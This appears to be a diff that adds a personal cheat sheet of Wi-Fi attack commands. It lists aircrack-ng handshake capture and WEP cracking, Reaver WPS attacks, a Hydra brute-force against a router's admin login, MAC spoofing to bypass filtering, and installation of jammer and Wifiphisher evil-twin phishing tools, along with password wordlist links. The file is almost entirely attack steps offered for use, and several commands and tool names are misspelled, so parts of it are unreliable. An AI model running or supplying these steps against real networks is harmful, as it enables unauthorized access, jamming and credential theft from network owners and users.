@@ -1,0 +1,86 @@
+--Common:
+airmon-ng start wlan0
+airodump-ng wlan0
+
+--Getting A HandShake and Data Capture:
+airmong-ng
+airmong-ng start wlan0
+airodump-ng waln0
+airodump-ng -c {Channel number} -w {file name} --bssid {mac} waln0
+
+--WEP Hacking:
+airmon-ng
+airmon-ng start wlan0
+airodump-ng wlan0
+airodump-ng -w {file} -c {channel} -bssid {mac} wlan0
+aireplay-ng -o 5 -a {bssid mac} waln0
+airoplay-ng -l 0 -a {bssid mac} waln0
+aireplay-ng -3 -b {bssid mac} waln0
+airecrack-ng file.cap
+
+--Reaver:
+airmon-ng
+airmon-ng start wlan0
+wash -i wlan0 -C
+reaver -i wlan0 -b {mac} -vv
+
+--Hacking with Gerix:
+Tool : https://github.com/J4r3tt/gerix-wifi-cracker-2
+
+--Wifi Hacking Kali:
+iwconfig
+airmon-ng
+airmon-ng start wlan0
+airmon-ng check kill
+airmon-ng start wlan0
+airodump-ng wlan0
+reaver -i wlan0 -b {bssid mac} -vv
+
+--Wordlist:
+https://github.com/danielmiessler/SecLists/tree/master/Passwords/WiFi-WPA
+https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt
+https://github.com/zxcv32/indian-wordlist
+https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10k-most-common.txt
+
+Tools:
+https://github.com/vladimircicovic/wifi_pass
+
+--Password Cracking:
+iwconfig wlan0
+hydra 192.168.0.1 -l admin -P rockyou.txt -t 1 -o ns -V -f http-get /index.asp
+
+--Mac Filtering:
+airmon-ng start wlan0
+airodump-ng wlan0
+airodump-ng c {channel} -bssid {mac} wlan0
+ifconfig wlan0 down
+macchaner -m {mac} wlan0
+ifconfig wlan0 up
+
+--Wifi Jammer:
+
+https://github.com/f4rih/websploit
+
+git clone https://github.com/f4rih/websploit.git
+cd websploit
+python setup.py install
+
+https://github.com/DanMcInerney/wifijammer
+
+git clone https://github.com/DanMcInerney/wifijammer
+cd wifijammer
+python wifijammer.py
+
+--WifiPhisher:
+
+https://github.com/wifiphisher/wifiphisher
+
+git clone https://github.com/wifiphisher/wifiphisher
+cd wifiphisher
+python setup.py install
+wifiphiser --nojamming
+
+
+
+
+
